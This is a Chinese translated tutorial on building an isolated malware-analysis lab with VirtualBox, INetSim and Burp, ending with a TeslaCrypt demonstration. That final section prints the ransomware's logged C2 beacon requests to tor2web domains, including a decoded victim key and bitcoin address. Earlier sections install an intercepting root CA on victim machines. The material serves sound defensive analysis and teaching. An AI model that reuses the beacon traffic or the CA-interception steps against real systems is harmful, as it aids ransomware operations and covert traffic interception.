**在这篇文章中，我将使用VirtualBox，INetSim和Burp建立一个恶意软件分析实验环境。该环境将与与主机操作系统和Internet隔离，成为一个独立的虚拟网络。我们将在其中设置两个受害者虚拟机（Ubuntu和Windows
7）以及分析服务器，以模拟HTTP或DNS等常见Internet服务，以便于我们能够记录和分析任何Linux或Windows恶意软件的网络通信。这些恶意软件将在没有察觉的情况下，连接到我们的服务器而不是Internet。此外，我们将会以臭名昭着的TeslaCrypt勒索软件为例进行分析。这是一种现已不存在的[勒索软件](https://en.wikipedia.org/wiki/TeslaCrypt)，从2015年到2016年中期感染了大量的系统。**

![1malwarenet4.png](https://image.3001.net/images/20180716/15317058959733.png!small)

## 1.创建虚拟机

以下是可用于下载Ubuntu和Windows 7虚拟机镜像的两个链接。

> Ubuntu（受害者机器1和分析机）：从[OsBoxes](https://www.osboxes.org/ubuntu/)下载Ubuntu 16.10
> 64 位（[直接下载链接](https://drive.google.com/file/d/0B_HAFnYs6Ur-> TVdfcHBrUVRWQk0/view?usp=sharing)）
>
> Windows 7（受害者机器2）：从[Microsoft Developer
> Website](https://developer.microsoft.com/en-us/microsoft-> edge/tools/vms/)下载（选择IE 11 on Win 7 (x86)和VirtualBox）

提示：如果你已经拥有一个未使用的Ubuntu虚拟机，则只需克隆它并在后续步骤中重复使用即可（右键单击>Clone）。

在开始之前，请确保你有足够可用的磁盘空间（我的建议是至少10-20 GB）。

### Ubuntu基本设置

OsBoxes为我们提供了一个即插即用的虚拟磁盘，我们只需简单地插入虚拟磁盘就可以立即使用。 首先我们来解压缩刚下载的文件。

    
    
    $ 7za e Ubuntu_16.10_Yakkety-VB-64bit.7z

解压缩后你将获得一个虚拟磁盘的VDI文件。我们将从Ubuntu镜像的基本设置开始，然后克隆我们的两个Ubuntu虚拟机。

在VirtualBox中，创建一个新机器（单击New按钮），并将其命名为Ubuntu
analysis（分析机）。然后，选择要分配的RAM大小。此时，VirtualBox将会询问你是否要创建新的虚拟硬盘，或使用已经存在的虚拟硬盘。选择“使用现有虚拟硬盘文件”，单击下拉列表右侧的目录图标，选择我们的VDI文件。

然后，我们启动虚拟机。默认密码是osboxes.org。

 **基本设置**

默认键盘使用QWERTY布局。如果你不太习惯的话，可以通过Settings > Text Entry进行更改。

此外，你也可以使用以下命令更改默认密码：

    
    
    $ passwd osboxes

更新软件包：

    
    
    $ sudo apt-get update
    $ sudo apt-get upgrade

 **安装 guest additions**

在运行VM的窗口的菜单中选择Devices > Insert guest additions CD image。然后会询问你是否要运行安装程序; 选择
yes，并输入默认密码（默认情况下为osboxes.org）。安装完成后，关闭VM。

 **克隆**

现在你已经有一个基本的Ubuntu VM，克隆它（在VirtualBox主界面右键点击 > Clone）。将克隆的Ubuntu命名为Ubuntu
victim，并选中复选框初始化其MAC地址。克隆类型我们选择Full clone，以进行较为完整的克隆操作。

![2vms.png](https://image.3001.net/images/20180716/15317059238018.png!small)

### Windows 7 基本设置

之前提供的下载链接指向包含OVA文件的ZIP存档。与VDI文件不同，它不仅是虚拟磁盘，而且还是虚拟机（包括其虚拟磁盘）的完整描述，因此从中创建虚拟机所我们唯一需要做的事情就是选择
**File > Import Appliance**在VirtualBox的主窗口。如果你的内存足够大，建议最好给它至少1024 MB的RAM。

导入完成后（这里可能需要等待几分钟），重命名Windows 7受害者虚拟机并启动它。

 **安装 guest additions**

在运行VM的窗口的菜单中选择Devices > Insert guest additions CD
image。然后从已插入的虚拟CD运行安装程序。安装完成后，关闭VM。

## 2.分析机的设置：INetSim，Burp

### INetSim

[INetSim](http://www.inetsim.org/index.html)是一个非常方便和强大的实用程序，允许你在一台机器上模拟一堆标准的Internet服务。默认情况下，它将模拟可以轻松调整的DNS，HTTP和SMTP。由于我们后续会将受害者机器配置为无Internet访问，因此我们需要使用INetSim进行模拟。

安装INetSim的[方法](http://www.inetsim.org/downloads.html)有多种，最简单的方法就是运行以下命令来安装（在分析机中）。

    
    
    $ sudo su
    $ echo "deb http://www.inetsim.org/debian/ binary/" > /etc/apt/sources.list.d/inetsim.list
    $ wget -O - http://www.inetsim.org/inetsim-archive-signing-key.asc | apt-key add -    $ apt update
    $ apt install inetsim

 **注意：** 想要在分析机中复制粘贴这些命令，请选择 设备>共享剪贴板>双向 进行设置。

我们稍后会讨论如何使用INetSim。

### Burp

INetSim虽说强大，但对SSL的支持却非常的有限。它附带了单一主机（inetsim.org）的证书，并且不支持动态生成SSL证书。这对于我们将会是一个问题，因为现在大多数恶意软件都使用SSL来加密其通信。因此，我们将使用Burp作为透明的SSL代理，它将位于受害者机器和INetSim的中间，对SSL流量进行拦截。当然，如果你现在并不需要拦截一些SSL流量的话，也可以不使用Burp。

Burp支持为我们的任何受害机器生成即时SSL证书。它还为我们创建了一个单根CA证书，我们稍后会在受害机器中导入。这样，我们就能拦截恶意软件发送的加密通信流量了。

你可以[从官网下载Burp](https://portswigger.net/burp/freedownload/)。下载是一个bash安装脚本，运行它来安装Burp：

    
    
    $ bash ~/Downloads/burpsuite_free_linux_v1_7_23.sh

默认情况下，Burp可执行文件为~/BurpSuiteFree/BurpSuiteFree。

## 3.设置一个隔离的虚拟网络

我们要建立一个包含三个虚拟机的隔离网络。此网络将无Internet访问。此外，我们希望分析机充当受害者机器的网络网关，以便能够轻松拦截网络流量并模拟各种服务，如DNS或HTTP。

为了实现这一目标，我们将使用VirtualBox internal网络。对于熟悉VirtualBox的人来说，internal网络与host-only网络的不同之处在于，internal网络根本无法访问主机。

对于三个虚拟机的各个虚拟机，请执行以下操作：

> 打开其设置
>
> 转到“Network ”部分
>
> 将附加到字段更改为Internal网络
>
> 输入恶意软件分析网络作为网络名称

###
![3net.png](https://image.3001.net/images/20180716/15317059879353.png!small)

### 分析机

启动分析机，打开终端运行ifconfig命令。你应该有一个名为enp0s3的接口。如果名称不同，请按照以下说明进行调整。

以root身份打开文件/etc/network/interfaces，在末尾添加以下内容：

    
    
    auto enp0s3
    iface enp0s3 inet static
     address 10.0.0.1
     netmask 255.255.255.0

这将在我们的虚拟网络上为机器分配静态IP 10.0.0.1。 现在我们已经配置了网络接口，我们使用以下命令来启动它：

    
    
    $ sudo ifup enp0s3

 **Ubuntu受害者机器**

这里的过程非常相似，只是我们将为它分配静态IP
10.0.0.2，并指示它使用10.0.0.1作为网关和DNS服务器。在文件/etc/network/interfaces的末尾附加以下内容：

    
    
    auto enp0s3
    iface enp0s3 inet static
     address 10.0.0.2
     gateway 10.0.0.1
     netmask 255.255.255.0
     dns-nameservers 10.0.0.1

并运行：

    
    
    $ sudo ifup enp0s3
    $ sudo service networking restart

现在你应该能够ping通分析机：

    
    
    $ ping 10.0.0.1
    PING 10.0.0.1 (10.0.0.1) 56(84) bytes of data.
    64 bytes from 10.0.0.1: icmp_seq=1 ttl=64 time=0.480 ms
    64 bytes from 10.0.0.1: icmp_seq=2 ttl=64 time=0.526 ms

 **Windows 7受害者机器**

右键单击任务栏中的网络图标（或转到“开始”菜单>“控制面板”>“网络和Internet”>“网络和共享中心”），单击“本地连接2”>“属性”，选中“Internet协议版本4”，然后单击属性按钮。

我们将静态IP 10.0.0.3分配给机器，其余部分配置与Ubuntu受害者机器类似。

![4netsettings.png](https://image.3001.net/images/20180716/15317060431393.png!small)

确保验证设置（单击 确定，应用等，直到所有设置窗口都消失）。你现在应该可以ping通分析机：

    
    
    > ping 10.0.0.1
    
    Pinging 10.0.0.1 with 32 bytes of data:
    Reply from 10.0.0.1: bytes=32 time<1ms TTL=64
    Reply from 10.0.0.1: bytes=32 time<1ms TTL=64

设置完成！

## 4.创建和还原快照

现在我们的受害者虚拟机已正确配置，并处于干净状态（即未被任何恶意软件感染）下，我们将对其当前状态进行快照，以便后续感染后再将其恢复至干净状态。

在VirtualBox中我们只需选择Machine > Take Snapshot。你可以将快照命名为Clean state。请务必为你的 Ubuntu 和
Windows 7受害者机器执行此操作。

当你想要将机器重置为干净状态时，只需将其关闭并选中复选框 Restore current snapshot ‘Clean state’即可。

##
![5snap.png](https://image.3001.net/images/20180716/15317060645651.png!small)

## 5.在分析机上使用INetSim和Burp来分析网络流量

### INetSim

像之前介绍的那样，INetSim能够模拟各种标准Internet服务，包括DNS，HTTP(S)，SMTP等。它有一个默认的配置文件/etc/inetsim/inetsim.conf，它还附带L了一个包含各种默认文件的数据目录（/var/lib/inetsim）。

由于你每次进行新分析时可能都需要不同的INetSim配置，因此我建议你创建一个analysis目录，其中包含每个分析的子目录。

    
    
    $ mkdir analysis

出于演示目的，我已经创建了一个子目录，并将默认的INetSim配置文件和数据文件夹复制到其中。

    
    
    $ mkdir analysis/test-analysis
    $ cp /etc/inetsim/inetsim.conf analysis/test-analysis
    $ sudo cp -r /var/lib/inetsim analysis/test-analysis/data
    $ sudo chmod -R 777 data
    $ cd analysis/test-analysis

默认情况下，INetSim仅侦听本地接口。为了使其支持我们虚拟网络中的所有机器，我们需要将刚刚复制的配置文件中的以下行：

    
    
    #service_bind_address   10.0.0.1

替换为：

    
    
    service_bind_address    0.0.0.0

现在，我们需要禁用systemd-resolved，这是默认情况下随Ubuntu提供的本地DNS服务器，否则会与INetSim的DNS服务器冲突。

    
    
    $ sudo systemctl disable systemd-resolved.service
    $ sudo service systemd-resolved stop

默认情况下，INetSim的DNS服务器会将所有域名解析为127.0.0.1。我们希望任何域名解析为10.0.0.1（分析机IP）; 取消以下行注释：

    
    
    #dns_default_ip    10.0.0.1

之前我提到过INetSim的SSL支持并不是最优的，因为它只有一个单一主机名证书（inetsim.org），并且不允许动态生成每个主机的证书。为了解决这个问题，我们将在443端口上运行Burp作为我们的透明代理。因此，我们需要将INetSim的HTTPS服务器绑定到另一个端口，例如8443端口。将以下行：

    
    
    #https_bind_port 443

替换为：

    
    
    https_bind_port 8443

现在，让我们运行INetSim！

    
    
    $ sudo inetsim --data data --conf inetsim.conf
    INetSim 1.2.6 (2016-08-29) by Matthias Eckert & Thomas Hungenberg
    [...]
    === INetSim main process started (PID 3605) ===
    Session ID: 3605
    Listening on: 0.0.0.0
    Real Date/Time: 2017-06-04 12:58:07
    Fake Date/Time: 2017-06-04 12:58:07 (Delta: 0 seconds)
     Forking services...
     * dns_53_tcp_udp - started (PID 3621)
     * irc_6667_tcp - started (PID 3631)
     * daytime_13_tcp - started (PID 3638)
     * discard_9_tcp - started (PID 3642)
     * discard_9_udp - started (PID 3643)
     * ident_113_tcp - started (PID 3634)
     * syslog_514_udp - started (PID 3635)
    [...]

如您所见，INetSim启动了一系列网络服务。这些都是可配置的，我们可以在配置文件中禁用。这个配置文件是一个很好的说明文档，并解释了INetSim的所有选项；因此，我建议你花几分钟时间阅读它。

现在，启动受害者VM，打开Web浏览器，在地址栏输入任何地址（如github.com）。你应该能看到以下内容：

![6vm7.png](https://image.3001.net/images/20180716/15317060984344.png!small)

（请注意，此默认文件对应于HTML文件data/http/fakefiles/sample.html。）

回到分析机上，关闭INetSim（CTRL + C）。

    
    
    * dns_53_tcp_udp - stopped (PID 3621)
    * irc_6667_tcp - stopped (PID 3631)
    * daytime_13_tcp - stopped (PID 3638)
    [...]
    Simulation stopped.
     Report written to '/var/log/inetsim/report/report.3877.txt' (24 lines)

如你所见，INetSim为我们创建了一份摘要报告。 它包含受害者机器与INetSim服务的所有交互信息。

    
    
    === Report for session '3877' ===
    
    Real start date : 2017-06-04 13:18:27
    Simulated start date : 2017-06-04 13:18:27
    Time difference on startup : none
    
    2017-06-04 13:18:38 First simulated date in log file
    2017-06-04 13:18:40 DNS connection, type: A, class: IN, requested name: github.com
    2017-06-04 13:18:40 HTTP connection, method: GET, URL: http://github.com/, file name: data/http/fakefiles/sample.html
    2017-06-04 13:18:40 HTTP connection, method: GET, URL: http://github.com/favicon.ico, file name: data/http/fakefiles/sample.html
    2017-06-04 13:18:40 Last simulated date in log file

 **SSL流量拦截**

为了分析SSL流量，我们需要运行Burp。当受害者机器启动SSL连接时，它将首先转发给Burp，然后burp再将其代理到INetSim。如果你现在并不需要拦截SSL流量，你可以跳过该部分。以下是Burp位置示意图：

![7ssl-network.png](https://image.3001.net/images/20180716/15317061254714.png!small)

以root身份启动Burp：

    
    
    $ sudo /home/osboxes/BurpSuiteFree/BurpSuiteFree

（注：这里我们必须要以root身份运行它，否则将无法绑定443端口）

创建一个临时项目，然后转到“Proxy”选项卡，再转到“Options”子选项卡。你将看到Burp的默认侦听器的侦听端口为8080。

![8burp-e1496650665932.png](https://image.3001.net/images/20180716/15317061488400.png!small)

单击与默认侦听器相对应的行，然后编辑它（Edit）按钮。配置如下：

绑定选项卡

> 绑定到港口：443
>
> 绑定地址：所有接口

请求处理选项卡：

> 重定向到主机：localhost
>
> 重定向到端口：8443
>
> 检查隐形代理支持

验证设置，类似于下面这样：

![9burp2.png](https://image.3001.net/images/20180716/15317061691954.png!small)

默认情况下，Burp会截停请求直至你放行。为了不必要的麻烦，我们可以在Intercept选项卡中禁用该功能。

由于当前使用的Burp为免费版，因此不允许我们保存项目。我们可以导出我们刚刚创建的设置，以便在下次启动Burp时导入它们。选择 Burp > Project
options > Save project options 完成此操作。

让我们确认我们当前的设置可以正常工作。启动INetSim，并运行：

    
    
    $ curl --insecure https://localhost

你应该获取到以下内容：

    
    
    <html>
     <head>
     <title>INetSim default HTML page</title>
     </head>
     <body>
     <p></p>
     <p align="center">This is the default HTML page for INetSim HTTP server fake mode.</p>
     <p align="center">This file is an HTML document.</p>
     </body>
    </html>

 **在我们的受害者机器上导入Burp的CA证书**

启动Windows 7受害者机器，并尝试浏览到HTTPS URL（例如<https://github.com>），你将看到类似于以下内容的警告：

![10sslwarn.png](https://image.3001.net/images/20180716/1531706192948.png!small)

这是因为Burp生成的由自己CA证书签名的SSL证书，并没有得到受害者机器信任。

在Burp中，在端口8080上添加新的代理监听器，监听所有接口（选项卡 代理>选项>按钮 添加）：

![11burp3.png](https://image.3001.net/images/20180716/15317062147898.png!small)

然后，从受害者机器，浏览到<http://10.0.0.1:8080>。

![12burpca.png](https://image.3001.net/images/20180716/15317062345143.png!small)

单击右上角的CA证书，下载Burp CA证书。

在Windows 7受害者机器上：打开文件，单击 安装证书> 下一步>将所有证书放在以下存储中：受信任的根证书颁发机构 >下一步

在Ubuntu的受害者机器上：

将证书转换为适当的格式（.crt）

    
    
    $ openssl x509 -in ~/Downloads/cacert.der -inform DER -out burp.crt

并复制到/usr/local/share/ca-certificates

    
    
    $ sudo cp burp.crt /usr/local/share/ca-certificates/

运行

    
    
    $ sudo update-ca-certificates

默认情况下，Firefox不使用系统的证书存储区。如果你希望SSL连接在Firefox中也能正常工作，请在Firefox设置中转到
高级>证书>导入。选择burp.crt，选中信任此CA以标识网站。

设置完成！

![13sslok.png](https://image.3001.net/images/20180716/1531706267704.png!small)

在受害者机器中导入Burp的CA证书后，请务必创建新的快照（例如，安装了Burp CA证书的Clean状态）。

## 6.在分析机和主机系统之间设置共享文件夹

在一些情况下你需要将一些文件传输到分析机或受害机器上；为了方便，我们可以设置一个共享文件夹。

在运行分析机的VirtualBox中，转到
设备>共享文件夹>共享文件夹设置。创建一个新的共享文件夹，选择要映射到的主机操作系统的本地文件夹，然后选择一个名称。选中复选框以使其永久化。

![14share.png](https://image.3001.net/images/20180716/15317062901090.png!small)

现在我们在分析机上，挂载共享文件夹：

    
    
    $ mkdir ~/malware-analysis-share
    $ sudo mount -t vboxsf -o uid=$UID,gid=$(id -g) malware-analysis-share ~/malware-analysis-share

 **将文件传输到受害者机器上**

在某些时候，你很可能需要将一些文件（例如恶意软件样本）传输到某个受害者机器上。为他们设置文件共享是一个坏主意，因为它意味着受害者机器（并且在一定程度上，你运行的恶意软件样本）可以访问它。

实现向Ubuntu受害者机器传输文件的最简单方法是使用netcat。以下一个简单的例子。

    
    
    # Receiving machine having IP 10.0.0.2
    $ nc -lvp 4444 > file.exe
    
    # Analysis machine (sender)
    $ cat file_to_transfer.exe | nc 10.0.0.2 4444

对于Window，遗憾的是我们并没有netcat可用。这里提供一种方案就是使用INetSim将文件提供给受害者机器。

    
    
    # inetsim.conf
    
    # Remove the default line: http_fakefile           exe     sample_gui.exe  x-msdos-program
    # Replace it by
    http_fakefile           exe     file_to_transfer.exe  x-msdos-program
    
    # And put file_to_transfer.exe in ./data/http/fakefiles

使用此配置，只需浏览任何以“.exe”结尾的URL（例如<http://github.com/file.exe>）即可。

![15dlexe.png](https://image.3001.net/images/20180716/15317063199030.png!small)

## 7.演示：TeslaCrypt勒索软件

我下载了勒索软件[TeslaCrypt](https://en.wikipedia.org/wiki/TeslaCrypt)的一个样本，并将其发送到了Windows
7受害者机器，执行TeslaCrypt。 几秒钟后，VM的所有文件都被进行了加密，并弹出了以下窗口。

![16tcrypt-1.png](https://image.3001.net/images/20180716/15317063396026.png!small)

![17randomwarepnwd.png](https://image.3001.net/images/20180716/15317063629063.png!small)

在检查了INetSim的日志后，我们可以看到勒索软件执行了以下DNS查找：

> 7tno4hib47vlep5o.tor2web.org
>
> 7tno4hib47vlep5o.tor2web.blutmagie.de
>
> 7tno4hib47vlep5o.tor2web.fi
>
> bitcoin.toshi.io

并向这些域发送了多个HTTP请求。

    
    
    HTTPS connection, method: GET, URL: https://7tno4hib47vlep5o.tor2web.org/state.php?U3ViamVjdD1QaW5nJmtleT0xNUIzOEIxOEFGMjBDMERCMkE3Qzc3MUUwMTQzNjNGMkNCODc4MUIxNTZENTE5Q0M1RjIyMDMzNUQ0NzE0QUEzJmFkZHI9MUxOVUYzQnFMM29iMUNUMmFWcDNjVzROYjh6a2tWaVZ3VCZmaWxlcz0wJnNpemU9MCZ2ZXJzaW9uPTAuMi42YSZkYXRlPTE0OTY2NDg2NzUmT1M9NzYwMSZJRD0xNiZzdWJpZD0wJmdhdGU9RzA=
    HTTPS connection, method: GET, URL: https://7tno4hib47vlep5o.tor2web.blutmagie.de/state.php?U3ViamVjdD1QaW5nJmtleT0xNUIzOEIxOEFGMjBDMERCMkE3Qzc3MUUwMTQzNjNGMkNCODc4MUIxNTZENTE5Q0M1RjIyMDMzNUQ0NzE0QUEzJmFkZHI9MUxOVUYzQnFMM29iMUNUMmFWcDNjVzROYjh6a2tWaVZ3VCZmaWxlcz0wJnNpemU9MCZ2ZXJzaW9uPTAuMi42YSZkYXRlPTE0OTY2NDg2NzUmT1M9NzYwMSZJRD0xNiZzdWJpZD0wJmdhdGU9RzE=
    HTTPS connection, method: GET, URL: https://7tno4hib47vlep5o.tor2web.fi/state.php?U3ViamVjdD1QaW5nJmtleT0xNUIzOEIxOEFGMjBDMERCMkE3Qzc3MUUwMTQzNjNGMkNCODc4MUIxNTZENTE5Q0M1RjIyMDMzNUQ0NzE0QUEzJmFkZHI9MUxOVUYzQnFMM29iMUNUMmFWcDNjVzROYjh6a2tWaVZ3VCZmaWxlcz0wJnNpemU9MCZ2ZXJzaW9uPTAuMi42YSZkYXRlPTE0OTY2NDg2NzUmT1M9NzYwMSZJRD0xNiZzdWJpZD0wJmdhdGU9RzI=
    HTTPS connection, method: GET, URL: https://bitcoin.toshi.io/api/v0/addresses/1LNUF3BqL3ob1CT2aVp3cW4Nb8zkkViVwT

可以看到这些请求分别发送到了类似tor2web.org，tor2web.blutmagie.de和tor2web.fi这样的地址。这些服务允许访问Tor网络，而无需安装Tor
Browser或类似工具。

该恶意软件与Tor隐藏服务7tno4hib47vlep5o.onion联系，这可能是某种[C＆C服务器](https://en.wikipedia.org/wiki/Command_and_control_\(malware\))。请求的payload是base64编码的字符串，解码后为：

    
    
    Subject=Ping
    &key=15B38B18AF20C0DB2A7C771E014363F2CB8781B156D519CC5F220335D4714AA3
    &addr=1LNUF3BqL3ob1CT2aVp3cW4Nb8zkkViVwT
    &files=0
    &size=0
    &version=0.2.6a
    &date=1496648675
    &OS=7601
    &ID=16
    &subid=0
    &gate=G1

它还对bitcoin.toshio.io进行API调用，可能是在检查赎金是否已支付给比特币地址1LNUF3BqL3ob1CT2aVp3cW4Nb8zkkViVwT。该恶意软件似乎为每台受感染的计算机都生成了一个唯一的比特币地址，因为该地址并没有[任何的转账交易记录](https://blockchain.info/address/1LNUF3BqL3ob1CT2aVp3cW4Nb8zkkViVwT)。

## 总结

希望通过本文的学习，能为你创建一个更为安全可靠的恶意软件分析环境。有一点需要记住的是，某些恶意软件会检测它们当前所处的环境，并且可能会根据检测结果调整其行为（例如，什么都不做）。这里有一篇MalwareBytes的文章，有兴趣的可以去阅读下。

另外，请记住，虽然分析恶意软件的网络流量非常有用，但它只是一种动态分析。其他还包括监控注册表，系统调用，打开/创建的文件等。Open Security
Training提供了一个[关于该主题的完整实践课程](http://opensecuritytraining.info/MalwareDynamicAnalysis.html)，最重要的是他还是免费的！因此，我也强烈建议大家可以去学习下。

 *******参考来源：[christophetd](https://blog.christophetd.fr/malware-analysis-lab-with-virtualbox-inetsim-and-burp/)， FB小编 secist 编译，转载请注明来自FreeBuf.COM**

